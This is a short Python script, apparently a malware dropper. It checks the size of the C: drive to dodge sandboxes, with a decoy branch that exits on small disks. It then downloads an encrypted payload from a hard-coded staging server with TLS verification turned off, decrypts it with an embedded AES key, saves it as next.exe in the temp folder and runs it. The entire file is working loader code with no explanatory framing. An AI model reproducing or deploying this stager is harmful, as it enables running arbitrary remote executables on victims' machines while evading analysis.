import binascii
import tempfile
import os
import requests
import shutil
import socket
import subprocess
import sys
from urllib3 import disable_warnings
from Crypto.Cipher import AES

FILENAME='42a0c7f6f80de6a5fb1671388772fcc7'
KEY='cad3395b33eb07ec5b4c219a1af8530c'
STAGING_SERVER='https://luminescence.threat.fr/'

total=shutil.disk_usage('C:\\')
gb_size=total // 1073741824
if(gb_size < 275):
    subprocess.Popen('cmd.exe')
    socket.gethostbyname('mail.utt.fr')
    exit(0)

r = requests.get(STAGING_SERVER + FILENAME, verify=False)

if(r.status_code != 200):
    print('File unavailable!')
    sys.exit(-1)

nonce=r.content[:16]
tag=r.content[16:32]
data=r.content[32:]
key=binascii.unhexlify(KEY)
cipher=AES.new(key, AES.MODE_EAX, nonce)
plaintext=cipher.decrypt(data)
try:
    cipher.verify(tag)

except ValueError:
    print('Key incorrect or message corrupted')

filename=os.path.join(tempfile.gettempdir(), 'next.exe')

f=open(filename, 'wb')

f.write(plaintext)

subprocess.run(filename)
